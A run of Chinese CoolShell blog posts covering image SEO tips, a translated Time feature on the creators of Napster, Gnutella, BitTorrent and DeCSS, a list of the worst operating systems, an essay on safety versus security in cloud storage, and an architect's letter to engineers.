完全地被搞糊涂了，Alice起身离开了，她正在正在离开的过程中，她听到了身后传来了一个熟悉的声音。“rem”，它说，“edlin”Alice 转过身去，看到了那只蛤蟆，她微笑着。“你总是说着这些古怪发音的单词”，她说，“但至少我知道他们是什么意思”。“chkdsk”， 蛤蟆说到。—–By Lincoln Spector TEXAS COMPUTER CURRENTS SEPTEMBER 1989# 图片搜索引擎优化Checklist作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn今天，专业的搜索引擎优化SEO（Search Engine Optimizers）会让你的网页或文章能更多得被搜索并访问到。而图片的搜索优化则是这项技术中非常特别的一部分，它可以让你的图片更容易地被人搜索到，比如：艺术图片，服务设计，或是家具等等。相信大家都知道图片远比文字更有吸引力，这是因为我们都知道——“一图胜千言”。!Image SEO在搜索引擎的世界里，有一组有限的因素决定着图片的位置。下面是一个Checklist可以让你把你的图片搜索优化做得更好。* 首先，你的图片应该是你的网页的一部分，他们使用了相同的样式。例如：页面的Title，head和Body文本必需和图片一样告诉访问者相同的故事。   * 在你的服务器上创建一个Images的目录，把你的图片都保存在那里。并且确认搜索引擎可以index这个目录。   * 在图片的文件名上使用描述性关键字，使用连字符号分隔关键字，千万不要使用下划线。   * 为图片的HTML中<image>标识中的alt属性提供一个简短的描述，你可以认为这是图片的tag，千万不要在alt属性中放入太多的关键字，就算是这些关键字都是相关的。   * 可以考虑使用一个短的文本来设置<image>的title属性，其中可以包含关键字。   * 在图片的周围可以配上详细的说明来描述这个图片。   * 如果你的图片有链接，那么，其链接文本对于图片搜索的rank是相当有用的。   * 另一方面，如果你的有其它的页面链接到了某一有重要图片的页面，那么，请创建 keyword-rich 链接文本到这一网页。   * 尽量使用高分辨率的图片，如果可能的话，提供不同分辨率的图片。   * 避免在Javascript里设置“点击看大图”的链接，Javascript会让搜索引擎导致难以索引的问题。   * 检查你图片的缩略图尺寸。缩略图应该到少能让人看清是什么，不然，就算是搜索位置靠前，人们也不会点击。   * 把照片存成 .JPG 文件，而其它简单的图片则存成 .GIF文件。搜索引擎会试图把GIF文件认为是256色的，而JPG是真彩色的。   * 经常更新你你的图片，因为这是搜索引擎会经常关临并给高分的依据。   * 另外，最好在你你的图片上加上水印，这样可以让人们对你的网站增加印象。但水印要恰到好处，不然反而令人生厌。
文章：来源# 偷了世界的程序员作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn本文译自美国时代（time.com）的《The Men Who Stole the World》，原作者：Lev Grossman。相当有传奇色彩，读起来很爽，翻译过来。译得不好，还请大家指正。本中的四个程序员可能并不是那么声名显赫，而且也很不老实，或许算不上成功，不过他们的确改变了世界。 **而本文有分析了互联网上P2P的那些事，相当的有参考价值** 。_2010年12月17日更新：修改了一些错误，理顺了一些语句。   2010年12月19日更新：增加了一些插图。 _————————正文————————十年前，有四个年轻人改变了这个世界的运作方式。他们使用的并不是法律或是武器或是金钱，而是使用软件来改变世界。他们当时有着激进和极具破坏性的想法，并把这些想法付诸于代码，在Internet上以免费自由方式发布。这四个人，没有一个完成了大学学业，却奠定了今天我们习惯的数字媒体环境的基础。然后，因为各种原因，他们也迅速地消失在公众视野中。1999年，美国东北大学的一个叫Shawn Fanning的一年级新生开发Napster，从此，成为了P2P文件共享和不需要大型机构或零售商就可以获得音乐的先锋和范例。《时代周刊》和《财富》把他放上了封面。那时，他在19岁。
就在同一年，一个挪威的只有十几岁的年轻人 Jon Lech Johansen，他和另两个今天都不为人知的程序员，写下了一个程序解密了商业的DVD，而他成为了全球盛名的“ DVD Jon.”，那年，他只有15岁。而在1997年，Justin Frankel，一个亚利桑那州塞多纳的18岁的黑客，开发了一个免费的MP3播放器——WinAmp，其成为了Windows操作系统上装机必备的软件，并造就了主流数字音乐的革命。在他发布的第18个月内，1500万人下载了这个软件。而三年后，Frankel 开发了 Gnutella，一个P2P的文件共享协议，没有中心结点，不像 Napster，其不可能被关闭。目前有上百万人还在使用它。2001年，Bram Cohen, 当年 26 岁，开发了一个P2P的文件传输共享协议—— BitTorrent，其以全新一流的架构全面优化了网络上大文件的共享和传输效率。 BitTorrent 也变成了整个Internet上发布大数据和文件的一个标准。在 2000年代的上半段，《时代》采访了这四个程序员。那个时候，看起来他们要以数字化动乱把整个复杂的传统媒体娱乐平台给拆除，而对有版权的电影，音乐和电视的收费则变得困难和不可能，那些艺术家也将无法从他们作品得到报酬，整个娱乐业包括时代华纳也将被炸为平地。而盗版业则借着这四个程员的软件侵袭了美国公司。
“毕竟”，我们在2003年报道到：“在整个信息经济中，不可能所有的信息都是免费的”。如果毁灭正在来临，那么， Fanning, Johansen, Frankel 和 Cohen 将是那“四骑士”（译注：启示录中的四骑士传统上被解释为瘟疫、战争、饥荒和死亡）。Shawn Fanning（左） 和 Bram Cohen（右）目录* 没有毁灭   * 没有盗版的人   * 四眼怪兽   * 简单之道#### **没有毁灭******毁灭并没有发生。但是整个娱乐业因此而改变，而这些改变的复杂性和逐渐演进超出了我们的期望。这些发生的故事，海盗王们的事，对于今天数字化世界正在发生的事情有非常高的参考和教育价值。Fanning, Johansen, Frankel 和 Cohen 现在都硅谷运作着自己的小的，合法的软件公司。他们现在没有在做和盗版有干系的事情——当然，如果他们真的没有。Fanning，四个人中唯一一个没有回复我们的采访请求的人，他较早地退出了毁灭传统唱片业的事业。在2001年，Napster因为不堪众多关于其协助并煽动版权侵权的法律诉论的重压，而不得不关闭。2002年，Fanning 创办了新的服务 Snocap —— 他尝试把文件共享合法化，在和相关的唱片公司合作下，Snocap 赋予消费者对其下载作品给于创作者报酬的权利。
但是，到那个时候，免费自由的文件共享程序像病毒一样的增涨，而用户则热衷于更换他们的音乐硬盘。他们仅在2001年8月一个月内就交换了30亿个文件。而要从这些文件交易中收到钱是根本不可能的。是的，要和免费竞争是很难的一件事。 Fanning 创造了一个连他自己都搞不定的怪物。所以，他停止继续尝试Snocap下去。 Fanning 的下一个项目是给游戏玩家的社交网络叫 Rupture，最终，他在2008年时以1500万美金把其卖给了电子艺界Electronic Arts ——这是他的第一次发薪日。他现在又于2008年11月开了一个公司 Path， 其主要提供给iPhone手机进行照片分享的服务。而Napster呢？今天他还在。这个商标在破产拍卖时被卖了，然后再被卖了，但其再也没有被 重建。现在其被 Best Buy 运营，其是 iTunes 的竞争者，其口号是—— “More than just a music store.” （不仅仅只是音乐商店）#### 没有盗版的人****    作为 Gnutella 的作者， Justin Frankel 是 Fanning 合法的继任者。不像 Fanning，他很早就收获了他的第一桶金。在1999年，当WinAmp大放光芒的时候，AOL买了WinAmp和他的公司——Nullsoft，价格应该在1亿美金左右。这让 Frankel 在20岁的时候就非常富有。当然，他也成了AOL的员工。
但这并不是很匹配，在Nullsoft, Frankel的做法是把软件开发到极致，然后免费发布出去。而在 AOL，软件的商业销售威胁并压倒了软件本身。“我致力于的产品，就像这样，我们不愿意金钱的掺入，我们正和其它公司做这笔交易，所以，产品也只能是这样的结果”，他回忆到，“没有人真正地去关心用户的体验是怎么样的”。与此同时，Frankel 用他的业余时间开发 Gnutella 。这是一个很有才的软件，不像Napster，其是真正的分布式，没有中心服务器，这样，也没有那个“关闭按钮”让那些律师按。在2000年3月的时候，Gnutella上线，其发了一个贴子：“看见没？AOL也能给你一些好的东西！”，但是就算是这样，也没有换来AOL对其忠爱，而一大堆互联网公司在那时试图并入大的媒体公司，在Napster被诉讼的中期，2004年，他离开了AOL。然后，他开始干了些有趣的事：他离开了他的成功地，他不用 Gnutella，也没有花一毛钱，就算是10年以后也是这样。 LimeWire —— 最流行的 Gnutella 客户端 —— 号称有 5千万用户。“当我开发它的时候，我最初主要是想用其在验证一下是否可行。所以我也不想从其中获益”，他说，“所以，甚至我和它一点关系也没有也说得通，其就是一个概念”。
Frankel 他最近从旧金山搬到了纽约城，现在全心打理自己的公司 Cockos (别问为什么叫这名)，这是一个关于音频产品套件，叫 Reaper。他坚持不懈地改进着它，并且他和他的用户保持着很近的关系，其用户数大约是几万人。“当前的策略我们并不想发展用户数量”，他说，“我们只是在享受目前的过程，并在做正确的事情”。他并不同意他是这个世界上最危险的geek，而滚石在2004年时对他则是这么认为的。“我不觉得盗版是很危险的”，他说，“根本上来说，大众的商业模式总是依赖于对所有事情的强控制——尤其是那些有瑕疵的模式。而作为一个软件开发者来说，多少会产生一定程度的盗版”， Gnutella 对他来说已是远古的事情了。“数字化盗版：它毁了唱片业了吗？没有。唱片业适应了吗？当然，很多人会说得更好。你应该更关注质量，以及更小一些乐队，等等这类的事”。“至于音乐流行和排行这么大的市场，这点盗版算什么？” 他边说边笑道， “我希望就是这样。”#### **四眼怪兽******在这四骑士中，只有 Bram Cohen他现在还在致力于其10年前的那个项目。他是 BitTorrent的创始人和首席科学家，而一个令人敬佩的旧金山的公司希望能把Cohen的这个令人瞠目的高效的内容分布式技术变成商业化应用。
这是一个奇特的公司：其合法的业务建立在一种仍然可能被用来进行大规模版权侵权的技术上。即使像 BitTorrent这样被8千万用户安装了的东西，其看上去还是像刚刚开始创业一样。 在BitTorrent上有相对较小的一部分是完全合法的 —— 最近的一个研究表明完全合法的部分占11%。而在这11%中，有更少的一部分产生了BitTorrent的收入。就像 Fanning 的 Snocap 一样，Cohen 试图把其BitTorrent从大量的盗版领域转移到合法的领域，这样才能挣到钱。2007年是BT发展最震动的一年，BitTorrent成为了20世纪福克斯、派拉蒙、华纳兄弟 和 米高梅 影业公司的合作伙伴，和他们一起共同形成了 Torrent Entertainment Network，主要提供电影，电视，电子游戏的购买和零售。就像 Fanning一样， Cohen 明了要摆脱盗版并不像看上去的那么容易。“所有的和它有关的事都是灾难”，他说到。Torrent Entertainment Network 于2008年底关闭。回想起来，你能明白这为什么不行。 BitTorrent在用户友好上做得还不够，并且，在其底层也不够有效率。它可以很快地像病毒一样地移动大量的数据。然后，当你要在上面算钱的时候，你不得不把速度给降下来，然后跟踪并控制其下载流，还和使用一些很扯淡的诸如“数字版权管理（DRM）”之流的技术，其大量地限制了用户那些是可以干的，哪些是要买的。
“我从这次失败中学到了很多很多的教训”， Cohen 悔恨地说。他现在的策略是只和那些只需要他的BT中的“快速”和“病毒式分布”的人合作。“与其去和那些内容提供商合作，为他们加上特权，以扩展我们的渠道，我们还不如直接获取那更大的渠道，那里的人更喜欢更为开放的方式”。迄今，对些感兴趣的独立电影制片商叫 _Four Eyed Monsters_ （四眼怪兽）和 一个叫 _Pioneer One_ （先驱者一号）的电视剧集的创作团队。说起来有点沮丧：Cohen正坐在一个消防水带上，一个程序员所梦想的成功的技术却失控了，而大的玩家又不想来玩。以他的编码天份，Cohen可以很容易的进入一家大型的公司。但那并不是他的风格。“我的确需要一定的自由度”，他说。他现在正在开发一个全新的事情——一个P2P的实时数据流的系统，而不是分散的文件。这个项止将可能有巨大的潜力，尤其在新闻、体育等事的互联网上的现场直播。当然，他还在维护着 BitTorrent，但他没有花太多的时间在上面。他说：“当我开发它的时候我就知道没错”。#### **简单之道******那么，在去年，盗版导致了什么？在美国，每个人都认为盗版对内容制造者的影响并没有那么坏。一份去年四月份美国审计署的报告，非常牵强地把盗版和滞销给联系在一起，但其结果尚无定论。
打击盗版在今天扁平化的世界上并不那么成功。无政府主义的世界观加上那些无与伦比的代码，不可能在那些合法的津津计较的商业界里传播。好的代码应该给用户有不同的选择，用户使用他们也并不一定是对行业有益的。而你真正需要的是向那些合法商业界挑战，挑战他们那些限制用户做用户想做的事的那种独裁性。（译注：这让我想到了腾讯360还有敏感词）另外一个重要的原因是唱片业的灾难是不会发生的。Steve Jobs 在 2003年4月28日，那段时间是互联网文件共享井喷的时候，Apple揭开了iTunes Music Store的面纱。在那个时候，我们都觉得iTunes不可能成功，就像Snocap以及他和它类似的项目都以失败告终。这是因为，你怎么可以可能和免费竞争呢？但是iTunes 确实成功了。Apple无情地强调着简单和有魅力的用户接口，以及有乔布斯对唱片业的那强有力的谈判，造就了一个最新型的专业的服务，其可以让你放心地下载并传输音乐。的确是做到了，尽管其是收费的，而且我们的购买需要和DRM（数字版权管理）扯上关系并限制我们。于是，我们看到了可以和免费竞争的东西——简单（译注：个人以为可能还需要加上一点时尚）。Napster, Gnutella 和 BitTorrent 从来没有在用户友好度上到达像Apple那样的境界。从来没有人在网上检查并整理那些文件内容，所以，当那些众多的文件被共享时，我们可以看到，很多文件加杂时广告，色情，木马，病毒以及其它一些垃圾。当乔布斯为我们提供了那条简单之路，我们接受了。很明显，自由太过头——至少数字媒体是这样的。
这是一个让那些年轻的海盗王们认真学习的教训。就像 Fanning, Frankel 和 Cohen一样， 其实，Jon Lech Johansen 并不能算得上是一个真正的海盗。他没有因为想把好莱坞搞破产而去帮助破解DVD，他这样做是因为他想在他的电脑上看电影。他的电脑安装的是Linux操作系统，而1999年，在Linux上根本没有可以用来播放DVD的程序，所以，他和他的伙伴们决定自己写一个，所以，他们不得不先把DVD给解密了。当美国电影协会（ Motion Picture Association of America）发现了DVD被破解的这个事，其向挪威政府控告 Johansen，并拘留了他。 他在奥斯陆(挪威的首都)受审两次，不过两次都被宣告无罪。因为他解密的DVD是他付费购买的。但Johansen真正的明白消费者对其购买的数字媒体的权利，这就好像一本书一样——我们可以不断的使用这本书，或是把这本书借出去，这是我们的权利。2005年， Johansen 去了加利福尼亚，在那里，他逆向工程了 FairPlay，这是苹果公司的用来保护其多媒体文件的DRM类软件（译注：这是苹果公司用来加密iPod的工具）。之后，他注意到了苹果公司产品的用户体验是多么的迷人，所以，他在想，应该把这些东西带给全世界给那些更为无序的非苹果的产品。
“我们看到这世上有很多很多的产品，但其并没有像他们那样良好地运作”，Johansen说，那时他26岁的程序员。“所以，我们应该开发一个系统，其可以让这些设备的整合起来并给消费者他一个相当不错的用户体验”。所谓的 “我们”，就是 Johansen 自己的公司—— doubleTwist，这个公司于2007年创建。 doubleTwist 软件是免费的，是一种像罗塞塔石一样的为数字多媒体软件文件开发的软件——它是可以翻译，和谐并组织大约500种不同设备的文件，把他们放在一起并提供一个相当漂亮的接口。其6月份， doubleTwist 摧出 Android App，当时就有超过50万的用户下载了（译注：大家可以Google一下，好评如潮）。去年， doubleTwist 开始了他的政变打出了这样的广告：“The Cure for iPhone Envy. Your iTunes library on any device. In seconds.”（嫉妒iPhone的对策。你的iTunes库可以在任何设备上，只需几秒钟。）它这个条幅挂在了苹果在旧金山的旗舰店的外墙上。Johansen 拒绝承认他和盗版有关系。“至于我被所指责的，真的和我没有什么关系”，他说。“我支持公平使用，意思是你的确是需要合法地获得内容，但你应该有权利使用任何一款设备或是应用程序来查看那些内容”。 Johansen 像所有的海盗王一样，他总是能写好的代码，而这些好的代码给了人民使用的权力。这才是盗版灾难不会发生的真正原因。 **盗版永远不希望所有的音乐和电影或是其它的东西成为免费的，他们想要的“free”其实是自由！**
————————————正文结束————————————最后一句话是点睛之笔，作者对这个世界的认识真是相当的透彻。所以，加粗了。我个人理解本文带给我如下的启示：1. 年轻就应该豁得出去，就应该有天不怕地不怕的想法，并付诸于行动。   2. 互联网上的盗版永远不会停止，与其说是盗版，其后面则是自由和无政府主义。   3. 自由过度并不是那些利益集团所希望的，并可能会让你惹上麻烦，不过这世界总是因此而改变。   4. 版权限制和免费并不是最好的，而最根本的是尊重用户的自由权以及不断地化繁为简以改善用户的体验。另，题外话，最近一段时间都在招人，有一天，一个同事和我说，“现在的这些程序员怎么回事啊？我问他们：‘你心目中的最牛的程序员是谁？’，居然回答不出来，有人说是Bill Gates，还有人说是马云，气死我了……”。我想想也真是可笑，难道，Dijkstra，Linus，Ken Thompson，Dennis Ritchie，Richard Steven，Bjarne Stroustrup…… 这些人不认识吗？就知道有钱人，哎，这个时代真是个文化缺失的年代！。推荐本站的几篇文章：Unix传奇(上篇)、Unix传奇(下篇)、计算机编程简史图、黑客的价值观。
其实细想一下，不单单是我国的计算机文化都是那些肤浅的大公司的文化。最后还是送给大家那句话—— **真正让我们成为局域网的不是那个墙，而是我们自己的肤浅** 。（全文完）# 十大史上最恶心的操作系统作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnComputer World上有人评出了有史以来十大臭名照著的操作系统，我们来看看倒底有那些，顺便也回顾一下操作系统的历史。下面的顺序通过时间顺序由古至今。目录* OS/360, 1964   * ITS(Incompatible Timesharing System), 60年代后期   * GNU Hurd, 1983启动，至今也没有完成   * Windows 1.01, 1985   * MS-DOS 4.0, 1988   * SCO Open Desktop, 1989   * JavaOS, 1996   * Windows Me (Millennium Edition千禧版), 2000   * Lindows/Linux XP Desktop, 2001/2006   * Windows Vista, 2006
#### OS/360, 1964这里，说的不是后面新版的OS/360，这里说的是60年代未70年代初的第一版的OS/360。当时的Project Manager，Fred Brooks， 《人月神话》 _The Mythical Man- Month_ 的作者，这是一本非常经典的告诉你软件开发是如何失败的一本书。在书中，Brooks解释说，他们需要了比较计划更多的内存，最后导致了预算超标了好几次，当然，最终这个操作系统还是很慢。另一方面，这本书中也出现了一句网络上的流行语：”Adding manpower to a late software project makes it later.” （在项目的后期加入人手只会让项目更拖）Brooks 喜欢像一本软件开发者的圣经一样描述，因为”everybody reads it, but nobody does anything about it.” 在书中他展开描述了这个故事后，我们才知道他是对的。#### **ITS**(Incompatible Timesharing System), 60年代后期在 DEC PDP-6 和PDP-10 使用汇编语言开发的操作系统上，当你面对着——每一个目录中只能有一个6个字符的文件时，每一个目录？（是的，每一个文件必需放在一个目录中，每一个目录也只能放一个文件），你会有什么样的想法？并且，这个操作系统的安全等零，例如：没有口令系统，你可以随意地登录，并且可以干所有的事。
但是，实际上来说，ITS却是一个非常重要的操作系统，因为它最终发展成了顶顶大名的Unix，今天许许多多的程序，如 Emacs 编辑器 和 Lisp语言，都是从ITS开始的。ITS操作系统，也是电脑黑客最早出现的地方，你可以看一看，Steve Levy 的经典图书 _Hackers_.。你会在这本书里找到娱乐和有趣，并会非常高兴自己并没有使用过这个操作系统。#### GNU Hurd, 1983启动，至今也没有完成你想知道为什么今天的Linux要叫做GNU/Linux吗？官方的解释是，Linux只不过是操作系统的内核（OS kernel ），而其周围全是GNU的软件，从而成为了一个完整的操作系统。 GNU 曾经在1983年向全世界宣告他们会在未来开发出一个取代Unix的操作系统，以此作为整个自由软件的操作系统。但是，25年过去了，GNU还是什么也没有完成，其操作系统内核 Hurd，就重来没有真正的开始工作过。虽然这是一个可能非常理想的操作系统，但作者把这个操作系统归入Top 10的理由是——经过了四分之一个世纪，GNU并没有按照自己的承诺完成对Unix的替代。但这个事情却被别的软件所取代，比如：Linux和BSD Unix，让我们看一下Linux那夸张的数量众多的发行版吧。
#### Windows 1.01, 1985Microsoft第一次尝试图形用户接口是为了 MS-DOS ，用一个词来形容，就是 dreadful。相当的ugly，用了两年的时间来开发但却几乎无法很好的工作。另外，这个图形界面中几乎没有什么可以运行的东西。直到两年后的Windows 2.03 ，Windows才开始像点样了。再让我们对这个操作系统加点侮辱性的词汇吧，自从Windows 1 发布以来，Mac 早就提供了起前的 System 2.1，当时的Mac OS 包含了AppleTalk 网络，PostScript 可以使用激光打印机，以及最早的PC文件系统：Hierarchical File System. 连比都没法比。#### MS-DOS 4.0, 19881988 年微软在其MS-DOS 上花费了大量的时间来改善其，当然，MS-DOS是一版不如一版，虽然比起MS-DOS3.3都很差，但自从令人恐怕MS-DOS 4.0问世以来，其它更烂MS- DOS都不能算得上烂了。你的程序就像时钟一样的总是终断，在程序执行到一样总是会完全死了。除了Windows的蓝屏之外，没有比这再烂的事了。
当时，几乎所有的PC要么都回到了MS-DOS 3.3 ，要么就转于使用 Digital Research的 DR-DOS 3.41 。虽然 DR-DOS 的版本号是在模仿MS-DOS 以提供相似的功能，但是Digital Research 最终在 1989 年使用了 DR-DOS 5.0 来避免人们会联想到 MS-DOS 4.0。#### SCO Open Desktop, 1989正面来说，这是第一个32位的 Unix 的图形界面，负面来说，这个操作系统的昵称叫 Open Deathtrap。Open Desktop 会是，也能够，并提供一些最令人娱乐的方式。一个编译器可以让整个系统core dump 。#### JavaOS, 1996想知道什么是最糟糕的操作系统的想法吗？那就是使用一种慢得像泥巴一样的语言Java来写这个操作系统。1996年，得到了IBM的帮助的Sun尝试了这件事。JavaOS 当时被设计在网络计算机上和嵌入式系统上。那会是怎么个样子呢？让我这样来说吧：这个世界上有许多的嵌入式操作系统，如： Qnx, VxWorks, Symbian, Windows CE 等等，但是，在这个圈子里，几乎没人知道还有JavaOS这么个东西。
虽然有几个公司得到了许可证，但是只有一个产品在商业上使用了这个东西，那就是Sun公司自己的可能都忘了的 JavaStation network computer。到了 2006年， Sun公司开始清理他自己的废弃的系统时，最终把结束了基于 Java的操作系统。#### Windows Me (Millennium Edition千禧版), 2000在Vista出来之前，Windows Me 绝对是Windows系列中最差的操作系统，作为Windows 98 SE的继任者，在 _PC World_ 25 史上最烂的科技产品中排行第四。这是一个想集16位和 32位为一身的操作系统。就像给一匹马的每条前腿上都装上一个轮子，而在后腿上钉上马掌。缓慢，不稳定，不安全，这些都是Windows的共性，但是Windows ME是终极的缓慢，不稳定和不安全。它究竟有多烂？烂到了微软自己也就卖了它一年多一点吧。#### Lindows/Linux XP Desktop, 2001/2006如果你想要把 Linux 和 Windows 放在一起会怎么样？Nothing very good。 Lindows, 始于2001年，号称要把所有的Windows的程序可以运行在Linux下， 但没有几个月，Lindows Inc. 放弃了这个想法。就算是WINE，这个程序也没有办法让足够多的Windows程序运行于Linux。
当然，这些SB的想法并没有就上终止，Russia-based TrustVerse 还在试图 “We’ll be everything Windows, but we’re Linux” 去创建一个 Linux XP Desktop。这个想法并没有比 Lindows 好多少。如果你真的想在Linux下运行Windows的应用程序，你应该看看——CodeWeavers的 CrossOver Linux.#### Windows Vista, 2006相信你对这个操作系统不会感到陌生，那我们就用再一一列举这个系统的不好的地方了。反正，就是慢，软硬件不兼容，高成本，安全差等等这些事。看看这篇文章 “Vista Capable” sticker你可能会知道一些，下面摘自 early “review” of Vista:> “I chose my laptop (a Sony TX770P) because it had the Vista logo and was > pretty disappointed that it not only wouldn’t run [Aero], but more important > wouldn’t run [Windows] Movie Maker. … Now I have a $2,100 e-mail machine.”
谁是这个评论的作者？ Mike Nash, Microsoft公司的副总裁，主管Window产品。这是和他一个内部的邮件，时间是 2007年2月25日。再看看这篇文章downgraded to XP, 以及这篇文章 extending the cutoff date for XP sales 还有这篇，hurrying Windows 7 to market 越来越有意思了。__文章：来源（全文完）# 谈谈数据安全和云存储作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn前些天，创新工场李开复同学在2012博鳌亚洲论坛表示：> “你们有多少人丢过手机？大概有15%。你们有多少人数据放在微软掉过的？我想不见得很多吧。所以相对来说是安全的。 > **放在大公司里比自己拿着掉的概率更大，你不相信的话，可以问陈冠希先生。** ”目录* 两种安全   * Security – 本地 vs 云端   * Availability – 本地 vs 云端   * 家庭私有云存储#### 两种安全看到这个消息的时候，我觉得李开复同学混淆了云存储和安全这两个概念，在英文里，有两个单词， **一个是Safety，一个是Security，很不幸的是，这两个英文单词翻译成中文都叫“安全”** ，因此总是被混淆，熟知英文又熟悉IT业的李开复同学在这个句子中混淆了这“两种安全”，我在我的微博上指出来后，居然还有很多网友继续混淆这两点，所以，这让我产生了写篇博文的说明一下，并顺着说说云存储和数据安全的个人理解。
* **所谓Safety，也就是数据不丢失的意思。** 这是目前云存储解决的问题，你可以把你的数据放在云端，你的所有的终端设备都可以通过云端来共享同步你的数据，这样， **云端就成了你数据同步和备份的数据中枢** 。 **说得专业一点，这又叫Availability** ，中文叫可用性，意思是，你的数据总是可用的，基本不会丢失 ，* **所谓Security，也就是数据的隐私和不泄露** 。这就是德艺双馨的陈冠希老师的痛，因为本来隐私和机密的数据被泄露出去了。就目前而言，我看到的云存储解决的都是Availability，而不是Security。Security解决的是私密和不泄露的问题。所以，李开复同学要让陈冠希老师把他的那些数据存到云端是可笑的， **对于那些私密照片，我相信陈冠希老师要求的是“Security”，而不是“Availability”** 。有网友在我的微博上指出：”一种数据是不能丢，但是可以泄露，那可以放云端，另一种是宁可丢都不能泄露，这就不能放在云端了”。这句话可以帮你更好地理解什么是Availability和Security。#### Security – 本地 vs 云端
现在的云解决的更多的是不丢失，而不是不泄漏。有一些网友在微博上和我争论道，其实云存储也能保证Security，因为有加密认证，云端会加密数据。我对此存有不同意见， **对于Security，我个人更觉得，Security的数据应该完全私有化，所以，放在本地会有更好的Security** 。我的理由如下：* 先问你自己一个问题，无论是不是大公司的云服务，你敢把你的银行帐号和口令存在云端吗？你的银行帐号和口令你可能都不敢放在你的电脑里。因为你要找到一个完全绝对只有你能访问的地方。比如说你的大脑。* 云端的认证和云端的数据加密有用吗？没有用的，因为我只要破解了这个用户口令，想想你的电脑成了肉鸡，你网盘的口令都不要，你云端的数据一下都成了浮云了。想想去年年底各大网站的口令泄露吧。* 数据存放在本地的移动硬盘上时，只有你的电脑同时插着USB链接线了上网线时，别人才有机会入侵，一旦你发现入侵，你还可以拔线。而你的数据放在云端，黑客可以全天候地入侵你的云端数据，得手后你都不知道你自己的帐号被黑了。* 无论是云端或是本地都防不住你的客户端被肉鸡，而云端还要面对比本地更多的风险，比如，云端无良员工，云端的代码漏洞，云端的黑客入侵，还有电邮电话诈骗，钓鱼网站，DNS劫持，政府审查，等等，等等。
看看银行和金融行业，完全是自己的专用网络，和互联网物理隔绝，这就是为了Security。Security就必需是完全绝对的对数据的私有化。比如某些公司的电脑不能使用USB，光驱等等外设，所有内网与外网的数据交换都必需受到监控。再多说一点，其实，要黑你的云端帐号并不用很高深的技术，有调查表明，伪装成客服人员或是警察给你打个电话问你要口令，大多数人是会告诉自己的帐号和口令的。还有就是抓住人的占便宜的心理，比如：在大街上撒U盘，大多数人是会捡回去插在自己或公司的电脑上浏览里面的内容的。所以，所谓物理隔绝不单单只是网线，还有这些外设。#### Availability – 本地 vs 云端硬盘是有寿命的，如果你不间断开机，你的硬盘估计也就能支持5年左右。光盘也是有寿命，因为是塑料也会老化的，和存放的条件有关。所以，在本地看来，数据总是容易丢失的。因为我们本地的存储设备并不可靠，只是家用级的，不是工业级的。云存储可以使用RAID之类的家庭里用不到的技术来镜像数据等技术手机，从而可以保证可用性很高，所以，放在云端的数据库可用性会更高一些（当然，就像开复老师说的一样还是要大公司才靠谱）。再多说一点，现在很多云存储仅仅只是做简单的和客户端本地的数据同步，没有版本控制，这意味着，如果你本地的文件本来是好的，但是后来你的电脑中了病毒后，你本地的数据被损坏了，不幸的是，这些被损坏的数据也同步到了云端，并分发到了你所有的终端设备中，于是灾难还是一样发生。所以，不支持版本控制，或是更轻量一些的“数据快照”功能的云，其实其数据并不Safe。
#### 家庭私有云存储云存储，对于PC用户来说，就目前而言，最多的应用还是那些各种各样的Dropbox类的网盘应用，这些应用很好地解决了数据的——备份、同步、共享这三个问题。但是，我觉得还是有一些如下问题没有解决。* Security问题。就是陈冠希老师的数据私密性的问题。   * 费用问题。相对于本地的存储来说，网盘费用太高了，还是一月或一年的算，Dropbox 100GB的网盘要200USD一年，这够买两个1TB的硬盘了，而且绝对可以用超过1年以上。   * 备份效率问题。通过网络备份，同步和共享，对于数据量大一点，效率太差了。我不知道大家怎么样？我现在更多的数据备份是我的一些家庭照片和视频，随着现在的数码相机的像素越来越高，一张照片的大小可以在4MB甚至10M，数据量太大了。而且，这些照片都个人的照片，不能传到网上做备份。每次在我的SD卡，PC，移动硬盘，iPad，手机上倒腾这些照片和视频的时候，总是很麻烦。（我昨晚在微博上做了个小调查，发现很多人家里是有很多设备的，像我这样，家里有3个本，2个台式机，2个kindle，1个iPad，2个智能手机，1个高清播放机的家庭都算是比较节俭的了）
**我觉得就目前这样的情况，个人家庭的私有云解决方案应该要出现了** 。也就是家庭内的数据中心解决方案，也许只需要像高清播放机那样的一个小盒子，里面可以用软件RAID两块或多块硬盘以保证数据的可用性，其还可以让你的数据在N多设备中共享，同步，备份，但你又不用担心互联网安全来担心这些数据，因为这仅仅是你的家庭局域网。因为小孩让家庭照片和视频暴增，导致我去年就在想应该有一个家庭私有网盘的东西，所以，当我前些天看到Space Monkey （新闻报道）的时候，我立马就觉得这就是我想要的东西。不过，国内还没有相应的产品，有想法的同学不妨试试去做一个类似于这样的产品，动作要快，千万不要让创新工场和腾讯抢先了。;-)（全文完）# 架构师给程序员的一封信作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面的邮件是某Architect发给他的Engineering团队的（来源），我觉得挺不错的，翻译过来，我相信我们所有的程序员都能从中学到很多东西。下面是这封邮件——每次当我开始做新的东西是我就会很兴奋。就算在软件圈里做了20年以后，每当开始新的旅程里，我都觉得我心中有一些东西不吐不快。这是我们大家一起的旅程。我强烈地相信我们详细规划的过程是很有乐趣的，富有挑战的和丰富多彩的。我想让这个旅程让你们难忘，并且能增添你们所有人的阅历。
这看起来有些唯心主义，不过，我想制订我的工作日程，我们的技术策略，以及你们密切合作的进度。这样一来，当你们做了什么相当不错的事，我们所有人都可以受益。我相当的尊重第一个工程师和他们的代码。1\. 代码是王。文档仅随其后 。所以，代码一定要和文档一致，并可以正确执行。2\. 测试，测试，测试。3\. 单元测试非常关键 。每一个在单元测试之后发现的bug需要开发人员双倍的开销。记住，我宁可增加你的薪水，也不愿意把这些钱发给另一个QA团队然后你再修正bug。因此，如果你的代码满是bug的话，我不得不把钱付给更多的人，而你也只能分得很小的一块饼。4\. 写下有效率的代码，不但是让人读得有效率，而且也是让CPU执行 地有效率。对于坏代码永远不会善罢甘休。5\. 多了解今天工作需要之外的事情。你不仅仅要知道今天干什么，还要知道明天需要什么。6\. 回家时不时做点菜，是的，真正的做菜。这会教会你菜谱和做饭的不同。菜谱告诉你这道菜需要什么样的食材，而你实际去做需要考虑的是你现在手上有什么……这就是其中的不同。（对于一个刚起步的公司，这是一个最大的教训）7\. 创新和好点子（技术或是产品），请与大家共享。
